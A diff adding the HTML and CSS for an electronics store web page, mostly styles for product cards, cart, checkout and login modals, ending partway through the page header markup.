@@ -1,0 +1,4488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechGadget - Premium Electronics Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        html {
+          scroll-behavior: smooth;
+        }
+      
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        /* Image Modal Styles */
+.image-modal {
+    display: none;
+    position: fixed;
+    z-index: 1003;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.9);
+    overflow: auto;
+}
+
+.modal-content {
+    margin: auto;
+    display: block;
+    width: 80%;
+    max-width: 700px;
+    max-height: 80vh;
+    object-fit: contain;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: zoom 0.3s ease;
+    border-radius: 8px;
+}
+
+@keyframes zoom {
+    from {transform: translate(-50%, -50%) scale(0.8); opacity: 0;}
+    to {transform: translate(-50%, -50%) scale(1); opacity: 1;}
+}
+
+.close-zoom {
+    position: absolute;
+    top: 20px;
+    right: 35px;
+    color: #fff;
+    font-size: 40px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 1004;
+}
+
+.close-zoom:hover {
+    color: #bbb;
+}
+        .hero-banner {
+            background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+            color: white;
+            padding: 80px 0;
+            position: relative;
+            overflow: hidden;
+            height: 50vh;
+            display: flex;
+            align-items: center;
+        }
+
+        .hero-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+        }
+
+        .hero-text {
+            flex: 1;
+            animation: fadeIn 1s ease-out;
+        }
+
+        .hero-visual {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            animation: slideIn 1s ease-out;
+        }
+
+        .hero-text h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .hero-text p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            max-width: 500px;
+            opacity: 0.9;
+        }
+        /* Login Modal Styles */
+.login-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 1003;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-content {
+    background: white;
+    padding: 30px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    position: relative;
+    animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.close-login {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    font-size: 24px;
+    cursor: pointer;
+    color: #6c757d;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 12px;
+    background: #0d6efd;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+}
+
+.login-btn:hover {
+    background: #0b5ed7;
+}
+
+.login-note {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #6c757d;
+}
+
+/* Account Dropdown Styles */
+.account-dropdown {
+    display: none;
+    position: absolute;
+    top: 100%;
+    right: 20px;
+    width: 300px;
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 5px 25px rgba(0, 0, 0, 0.15);
+    z-index: 1002;
+    margin-top: 10px;
+}
+
+.user-header {
+    padding: 20px;
+    border-bottom: 1px solid #dee2e6;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+    color: white;
+    border-radius: 10px 10px 0 0;
+}
+
+.user-avatar {
+    width: 50px;
+    height: 50px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+}
+
+.user-info h4 {
+    margin: 0;
+    font-size: 18px;
+}
+
+.user-info p {
+    margin: 5px 0 0 0;
+    opacity: 0.9;
+    font-size: 14px;
+}
+
+.account-menu {
+    padding: 10px 0;
+}
+
+.menu-item {
+    display: flex;
+    align-items: center;
+    padding: 12px 20px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    gap: 15px;
+}
+
+.menu-item:hover {
+    background: #f8f9fa;
+}
+
+.menu-item i {
+    width: 20px;
+    color: #0d6efd;
+}
+
+.cart-badge {
+    background: #dc3545;
+    color: white;
+    border-radius: 10px;
+    padding: 2px 8px;
+    font-size: 12px;
+    margin-left: auto;
+}
+
+        .cta-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: white;
+            color: #0d6efd;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-3px);
+        }
+
+        .phone-showcase {
+            position: relative;
+            width: 300px;
+            height: 300px;
+        }
+
+        .phone-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.3));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .floating-elements {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+        }
+
+        .floating-element {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(5px);
+            animation: floatAround 10s infinite linear;
+        }
+
+        .element-1 {
+            width: 60px;
+            height: 60px;
+            top: 20px;
+            left: -20px;
+            animation-delay: 0s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .element-2 {
+            width: 40px;
+            height: 40px;
+            bottom: 40px;
+            right: -10px;
+            animation-delay: -3s;
+        }
+
+        .element-3 {
+            width: 50px;
+            height: 50px;
+            top: 100px;
+            right: -25px;
+            animation-delay: -6s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .stats {
+            display: flex;
+            gap: 30px;
+            margin-top: 40px;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .stat-icon {
+            background: rgba(255, 255, 255, 0.2);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .stat-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .stat-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes floatAround {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(5px, -5px) rotate(5deg); }
+            50% { transform: translate(10px, 0) rotate(0deg); }
+            75% { transform: translate(5px, 5px) rotate(-5deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+        /* Section Header Styles */
+.section-header {
+    text-align: center;
+    margin-bottom: 40px;
+}
+
+.section-header h2 {
+    font-size: 32px;
+    color: #0d6efd;
+    margin-bottom: 10px;
+}
+
+.section-header p {
+    font-size: 18px;
+    color: #6c757d;
+}
+
+/* Products Grid for 2 columns */
+.products-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr); /* 2 columns */
+    gap: 30px;
+}
+
+/* For larger screens, you might want more columns */
+@media (min-width: 992px) {
+    .products-grid {
+        grid-template-columns: repeat(2, 1fr); /* Keep 2 columns on large screens */
+    }
+}
+
+/* For tablets */
+@media (max-width: 768px) {
+    .products-grid {
+        grid-template-columns: repeat(2, 1fr); /* 2 columns on tablets */
+        gap: 20px;
+    }
+}
+
+/* For mobile phones */
+@media (max-width: 576px) {
+    .products-grid {
+        grid-template-columns: 1fr; /* 1 column on mobile */
+    }
+}
+        /* Responsive Design */
+        @media (max-width: 992px) {
+            .hero-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .hero-text {
+                margin-bottom: 40px;
+            }
+            
+            .hero-text p {
+                margin: 0 auto 30px;
+            }
+            
+            .stats {
+                justify-content: center;
+            }
+            
+            .hero-banner {
+                height: auto;
+                padding: 60px 0;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .hero-text h1 {
+                font-size: 2.5rem;
+            }
+            
+            .cta-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 300px;
+                justify-content: center;
+            }
+            
+            .stats {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header Styles */
+        .header {
+            background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+            padding: 15px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            font-size: 24px;
+            margin-right: 10px;
+            color: white;
+        }
+        .highlight {
+    background-color: yellow;
+    font-weight: bold;
+    padding: 0 2px;
+}
+
+.no-results {
+    grid-column: 1 / -1;
+    text-align: center;
+    padding: 40px;
+    color: #6c757d;
+    font-style: italic;
+}
+ .search-container {
+  flex: 1;
+  max-width: 500px;
+  margin: 0 20px;
+  display: grid;           /* grid layout */
+  grid-template-columns: 1fr auto; /* input takes full, icon auto */
+  align-items: center;
+  gap: 10px;               /* space between input & icon */
+}
+
+#searchInput {
+  width: 100%;
+  padding: 12px 15px;
+  border: none;
+  border-radius: 30px;
+  font-size: 16px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+.search-icon {
+  color: #0d6efd;
+  cursor: pointer;
+  font-size: 18px;
+}
+
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .account-link, .cart-link {
+            text-decoration: none;
+            color: white;
+            font-size: 16px;
+            position: relative;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .account-link i, .cart-link i {
+            margin-right: 5px;
+        }
+
+        .cart-icon {
+            font-size: 24px;
+            transition: transform 0.3s ease;
+        }
+
+        .cart-link:hover .cart-icon {
+            transform: scale(1.2);
+        }
+
+        .cart-count {
+            background-color: #dc3545;
+            color: white;
+            border-radius: 50%;
+            padding: 4px 8px;
+            font-size: 12px;
+            position: absolute;
+            top: -10px;
+            right: -10px;
+        }
+
+        /* Navbar */
+        .navbar {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 10px;
+        }
+
+        .nav-links {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+        }
+
+        .nav-links li a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 10px 15px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .nav-links li a:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Section Titles */
+        .section-title {
+            font-size: 32px;
+            text-align: center;
+            margin-bottom: 40px;
+            color: #0d6efd;
+            position: relative;
+            padding-bottom: 15px;
+        }
+
+        .section-title:after {
+            content: '';
+            display: block;
+            width: 80px;
+            height: 4px;
+            background-color: #0d6efd;
+            margin: 10px auto;
+            border-radius: 2px;
+        }
+
+        /* Products Section */
+        .products-section {
+            padding: 60px 0;
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .product-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .product-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+
+        .product-card:hover img {
+            transform: scale(1.05);
+        }
+
+        .product-info {
+            padding: 20px;
+        }
+
+        .product-info h3 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #212529;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .price {
+            font-size: 24px;
+            font-weight: 700;
+            color: #dc3545;
+            margin-bottom: 15px;
+        }
+
+        .quantity-selector {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .qty-btn {
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.3s ease;
+        }
+
+        .qty-btn:hover {
+            background-color: #0b5ed7;
+        }
+
+        .qty-input {
+            width: 50px;
+            text-align: center;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            margin: 0 10px;
+            padding: 5px;
+        }
+
+        .add-to-cart-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        .add-to-cart-btn:hover {
+            background-color: #0b5ed7;
+        }
+
+        /* Categories Section */
+        .categories-section {
+            padding: 60px 0;
+            background-color: white;
+        }
+
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .category-card {
+            background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+            border-radius: 10px;
+            overflow: hidden;
+            text-align: center;
+            padding: 30px 20px;
+            color: white;
+            transition: transform 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .category-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .category-card i {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .category-card h3 {
+            font-size: 24px;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #212529;
+            color: white;
+            padding: 40px 0 20px;
+            margin-top: 70px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section h4 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #0d6efd;
+        }
+
+        .footer-section p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section ul li a {
+            color: #adb5bd;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #343a40;
+        }
+
+        /* Cart Modal Styles */
+        .cart-modal {
+    position: fixed;
+    top: 0;
+    right: -400px;
+    width: 380px;
+    height: 100vh;
+    background: white;
+    box-shadow: -5px 0 25px rgba(0, 0, 0, 0.15);
+    z-index: 1001;
+    transition: right 0.4s ease;
+    display: flex;
+    flex-direction: column;
+}
+
+        .cart-modal.active {
+    right: 0;
+}
+
+        .cart-header {
+            padding: 20px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0d6efd;
+            color: white;
+        }
+
+        .cart-header h2 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .close-cart {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+       
+.cart-items {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px;
+}
+
+        .cart-item {
+            display: flex;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .cart-item-img {
+            width: 80px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-right: 15px;
+        }
+
+        .cart-item-details {
+            flex: 1;
+        }
+
+        .cart-item-name {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .cart-item-price {
+            color: #dc3545;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .cart-item-quantity {
+            display: flex;
+            align-items: center;
+        }
+
+        .cart-item-quantity input {
+            width: 40px;
+            text-align: center;
+            margin: 0 8px;
+        }
+
+        .remove-item {
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 10px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+.cart-footer {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    position: sticky;
+    top: 0;
+    background: white;
+    padding: 15px 20px;
+    z-index: 5;
+    border-bottom: 1px solid #dee2e6;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+
+
+        
+.checkout-btn:hover {
+    background-color: #0b5ed7;
+}
+
+
+.cart-total {
+    display: flex;
+    justify-content: space-between;
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 10px;
+}
+
+     
+.checkout-btn {
+    width: 100%;
+    padding: 12px;
+    background-color: #0d6efd;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: background-color 0.3s ease;
+}
+
+        
+
+        /* Checkout Modal Styles */
+        .checkout-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1002;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .checkout-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .checkout-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+            transform: translateY(-50px);
+            transition: transform 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .checkout-modal.active .checkout-content {
+            transform: translateY(0);
+        }
+
+        .close-checkout {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #6c757d;
+        }
+
+        .checkout-content h2 {
+            margin-bottom: 20px;
+            color: #0d6efd;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .form-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #0b5ed7;
+        }
+
+        .empty-cart {
+            text-align: center;
+            padding: 40px 20px;
+            color: #6c757d;
+        }
+
+        .empty-cart i {
+            font-size: 64px;
+            margin-bottom: 15px;
+            color: #dee2e6;
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .header-top {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .search-container {
+                max-width: 100%;
+                margin: 15px 0;
+            }
+            
+            .nav-links {
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+            
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .cart-modal {
+                width: 100%;
+                right: -100%;
+            }
+            
+            .checkout-content {
+                margin: 20px;
+                width: calc(100% - 40px);
+            }
+        }
+        /* Categories Hero Section */
+.categories-hero {
+    background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+    padding: 80px 0;
+    color: white;
+    text-align: center;
+}
+
+.hero-header h1 {
+    font-size: 2.5rem;
+    margin-bottom: 15px;
+    font-weight: 700;
+}
+
+.hero-header p {
+    font-size: 1.2rem;
+    opacity: 0.9;
+    margin-bottom: 50px;
+}
+
+.categories-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 30px;
+    margin-top: 30px;
+}
+
+.category-card {
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    padding: 30px;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.category-card:hover {
+    transform: translateY(-10px);
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+}
+
+.category-icon {
+    font-size: 3rem;
+    margin-bottom: 20px;
+    color: #fff;
+}
+
+.category-card h2 {
+    font-size: 1.8rem;
+    margin-bottom: 15px;
+    color: #fff;
+}
+
+.category-card p {
+    margin-bottom: 20px;
+    opacity: 0.9;
+}
+
+.category-features {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 25px;
+    justify-content: center;
+}
+
+.category-features span {
+    background: rgba(255, 255, 255, 0.2);
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 0.9rem;
+}
+
+.cta-button {
+    display: inline-block;
+    background: white;
+    color: #0d6efd;
+    padding: 12px 30px;
+    border-radius: 30px;
+    text-decoration: none;
+    font-weight: 600;
+    transition: all 0.3s ease;
+}
+
+.cta-button:hover {
+    background: #f8f9fa;
+    transform: scale(1.05);
+}
+
+/* Products Sections */
+.products-section {
+    padding: 80px 0;
+}
+
+.section-header {
+    text-align: center;
+    margin-bottom: 50px;
+}
+
+.section-header h2 {
+    font-size: 2.2rem;
+    color: #0d6efd;
+    margin-bottom: 15px;
+}
+
+.section-header p {
+    color: #6c757d;
+    font-size: 1.1rem;
+}
+
+.products-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 30px;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    .categories-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .hero-header h1 {
+        font-size: 2rem;
+    }
+    
+    .category-card {
+        padding: 20px;
+    }
+}
+/* Auth Tabs */
+.auth-tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #dee2e6;
+}
+
+.auth-tab {
+    flex: 1;
+    padding: 12px;
+    background: none;
+    border: none;
+    border-bottom: 3px solid transparent;
+    font-size: 16px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.auth-tab.active {
+    border-bottom-color: #0d6efd;
+    color: #0d6efd;
+    font-weight: 600;
+}
+
+.auth-tab:hover:not(.active) {
+    background-color: #f8f9fa;
+}
+
+/* Auth Forms */
+.auth-form {
+    display: none;
+}
+
+.auth-form.active {
+    display: block;
+}
+
+.auth-form .form-group {
+    margin-bottom: 15px;
+}
+
+.auth-form input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #dee2e6;
+    border-radius: 5px;
+    font-size: 16px;
+    transition: border-color 0.3s ease;
+}
+
+.auth-form input:focus {
+    outline: none;
+    border-color: #0d6efd;
+    box-shadow: 0 0 0 2px rgba(13, 110, 253, 0.1);
+}
+
+.auth-btn {
+    width: 100%;
+    padding: 12px;
+    background: #0d6efd;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+}
+
+.auth-btn:hover {
+    background: #0b5ed7;
+}
+
+.auth-note {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+    color: #6c757d;
+}
+
+/* Login Modal Styles */
+.login-modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 1003;
+    justify-content: center;
+    align-items: center;
+}
+
+.login-content {
+    background: white;
+    padding: 30px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    position: relative;
+    animation: slideDown 0.3s ease;
+}
+
+@keyframes slideDown {
+    from { transform: translateY(-50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+
+.close-login {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    font-size: 24px;
+    cursor: pointer;
+    color: #6c757d;
+}
+
+.login-content h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    color: #0d6efd;
+}
+/* Account Dropdown Styles */
+.account-dropdown {
+    display: none;
+    position: absolute;
+    top: 130px;
+    right: 20px;
+    width: 320px;
+
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+    z-index: 1002;
+    margin-top: 10px;
+    border: 1px solid #e0e0e0;
+    animation: dropdownFade 0.2s ease;
+}
+
+@keyframes dropdownFade {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.user-header {
+    padding: 20px;
+    border-bottom: 1px solid #f0f0f0;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    background: linear-gradient(135deg, #0d6efd 0%, #0a58ca 100%);
+    color: white;
+    border-radius: 12px 12px 0 0;
+}
+
+.user-avatar {
+    width: 50px;
+    height: 50px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    backdrop-filter: blur(10px);
+}
+
+.user-info h4 {
+    margin: 0;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.user-info p {
+    margin: 4px 0 0 0;
+    opacity: 0.9;
+    font-size: 13px;
+}
+
+.account-menu {
+    padding: 8px 0;
+}
+
+.menu-item {
+    display: flex;
+    align-items: center;
+    padding: 12px 20px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    gap: 12px;
+    position: relative;
+    border: none;
+    background: none;
+    width: 100%;
+    text-align: left;
+    font-size: 14px;
+}
+
+.menu-item:hover {
+    background: #f8f9fa;
+}
+
+.menu-item i {
+    width: 18px;
+    color: #6c757d;
+    font-size: 14px;
+    text-align: center;
+}
+
+.menu-item span {
+    flex: 1;
+    color: #333;
+    font-weight: 500;
+}
+
+.menu-badge {
+    background: #0d6efd;
+    color: white;
+    border-radius: 12px;
+    padding: 2px 8px;
+    font-size: 11px;
+    font-weight: 600;
+    min-width: 20px;
+    text-align: center;
+}
+
+.menu-divider {
+    height: 1px;
+    background: #f0f0f0;
+    margin: 8px 0;
+}
+
+/* Specific menu item colors */
+#viewOrders i { color: #28a745; }
+#viewCart i { color: #ffc107; }
+#savedItems i { color: #dc3545; }
+#accountSettings i { color: #6c757d; }
+#logoutBtn i { color: #dc3545; }
+
+#logoutBtn:hover {
+    background: #fff5f5;
+}
+
+/* Responsive design */
+@media (max-width: 768px) {
+    .account-dropdown {
+        right: 10px;
+        width: 280px;
+    }
+    
+    .user-header {
+        padding: 15px;
+    }
+    
+    .menu-item {
+        padding: 10px 15px;
+    }
+}
+    </style>
+</head>
+<body>
+    <!-- Overlay -->
+    <div class="overlay" id="overlay"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-top">
+                <div class="logo">
+                    <i class="fas fa-store logo-icon"></i>
+                    <h1 class="logo-text">DESOLUTION TECH</h1>
+                </div>
+                <div class="search-container">
+                    <input type="text" id="searchInput" placeholder="Search for phones, laptops, accessories...">
+                    <i class="fas fa-search search-icon"></i>
+                </div>
+                <div class="header-actions">
+                   <div class="account-link" id="accountLink">
+    <i class="fas fa-user"></i> <span id="accountText">Account</span>
+</div>
